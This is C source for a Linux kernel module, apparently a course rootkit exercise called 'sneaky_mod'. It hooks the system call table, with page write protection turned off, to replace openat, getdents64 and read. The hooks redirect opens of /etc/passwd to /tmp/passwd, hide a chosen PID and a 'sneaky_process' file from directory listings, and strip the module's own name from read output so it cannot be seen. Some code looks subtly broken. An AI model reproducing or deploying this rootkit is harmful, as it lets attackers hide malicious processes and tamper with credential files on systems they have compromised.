#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/dirent.h>

#define PREFIX "sneaky_process"

// struct linux_dirent64 {
//   u64 d_ino;
//   s64 d_off;
//   unsigned short d_reclen;
//   unsigned char d_type;
//   char d_name[];
// };
static char * pid = "";
//MODULE_LICENSE("GPL");
module_param(pid, charp, 0);
MODULE_PARM_DESC(pid, "sneaky program pid");

/////////////// TODO /////////////////////////

//This is a pointer to the system call table
static unsigned long * sys_call_table;
// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  if(pte->pte &~_PAGE_RW){
    pte->pte |=_PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);

// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
{
  // Implement the sneaky part here
  char * pathname = (char *) regs->si;
  // unsigned long buffer = regs->si;
  if (strcmp(pathname, "/etc/passwd") == 0) {
    // (void *)pathname??????????????
    copy_to_user((void *)pathname, "/tmp/passwd", strlen("/tmp/passwd"));
  }
  /////////////// TODO /////////////////////////
  return (*original_openat)(regs);
}

///////////////////// TODO /////////////////////////
//?????????????
asmlinkage int (*original_getdents)(struct pt_regs *);

asmlinkage int sneaky_sys_getdents(struct pt_regs * regs){
  // First check whether return value of original_getdents <=0
  struct linux_dirent64 * dirp = (struct linux_dirent64 *)regs->si;
  struct linux_dirent64 * curr = dirp;
  int return_value = (*original_getdents)(regs);
  int offset = 0;
  if(return_value<=0){
    return return_value;
  }
  while (offset < return_value){
    if ((strcmp(curr->d_name, pid) == 0) || (strcmp(curr->d_name, PREFIX) == 0)) {
      char * next = (char *)curr + curr->d_reclen;
      //memmove(void *str1, const void *str2, size_t n) copies n characters from str2 to str1
      memmove(curr, next, (void *)dirp + return_value - (void *)next);
      return_value -= curr->d_reclen;
    }else{
      offset += curr->d_reclen;
      curr = (struct linux_dirent64 *)((char *)curr + curr->d_reclen);
    }
  }
  return return_value;
}

asmlinkage ssize_t (*original_read)(struct pt_regs *);

asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs){
  ssize_t return_value = (*original_read)(regs);
  char * buf = (char *)regs->si;
  //finds the first occurrence of the substring
  char * start = strstr(buf, "sneaky_mod ");
  if(return_value <= 0){
    return return_value;
  }
  if (start != NULL) {
    char * line_end = strchr(start, '\n');
    if(line_end != NULL){
      line_end++;
      memmove(start, line_end, (char __user*)(buf + return_value)-line_end);
      return_value -= (ssize_t) (line_end - start);
    }
  }
  return return_value;
}
// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");
  /////////////// TODO /////////////////////////

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];
  /////////////// TODO /////////////////////////
  original_getdents = (void *)sys_call_table[__NR_getdents64];
  original_read = (void *)sys_call_table[__NR_read];
  
  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);
  
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  /////////////// TODO /////////////////////////
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents;
  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
  // You need to replace other system calls you need to hack here
  
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  /////////////// TODO /////////////////////////
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents;
  sys_call_table[__NR_read] = (unsigned long)original_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);  
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("GPL");